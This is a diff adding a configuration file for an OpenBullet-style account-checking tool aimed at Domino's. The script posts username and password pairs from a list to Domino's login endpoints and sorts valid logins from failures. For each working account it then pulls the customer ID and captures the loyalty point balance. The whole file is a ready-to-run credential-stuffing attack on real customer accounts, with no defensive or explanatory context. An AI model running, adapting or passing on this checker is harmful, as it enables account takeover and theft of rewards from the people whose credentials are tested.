@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "dominos",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-06T01:40:00.689062-04:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "guid" 
+
+REQUEST POST "https://authproxy.dominos.com/auth-proxy-service/token.oauth2" 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: authproxy.dominos.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "DPZ-Language: en" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Authorization: bm9sby1ybTo=" 
+  HEADER "X-DPZ-D: <guid>" 
+  HEADER "Content-Length: 547" 
+  HEADER "Origin: https://authproxy.dominos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://authproxy.dominos.com/assets/build/xdomain/proxy.html" 
+  HEADER "TE: Trailers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password combination." 
+
+#token PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+REQUEST POST "https://order.dominos.com/power/login" 
+  CONTENT "loyaltyIsActive=true&rememberMe=false&gRecaptchaResponse=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: order.dominos.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "DPZ-Language: en" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "X-DPZ-D: <guid>" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Origin: https://order.dominos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://order.dominos.com/assets/build/xdomain/proxy.html" 
+
+PARSE "<SOURCE>" JSON "CustomerID" -> VAR "user_id" 
+
+REQUEST GET "https://order.dominos.com/power/customer/<user_id>/loyalty?_=1616288952874" 
+  
+  HEADER "Host: order.dominos.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "DPZ-Language: en" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "X-DPZ-D: <guid>" 
+  HEADER "Authorization: Bearer <token>" 
+
+PARSE "<SOURCE>" JSON "VestedPointBalance" CreateEmpty=FALSE -> CAP "Points" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Points>" LessThan "60" 
+
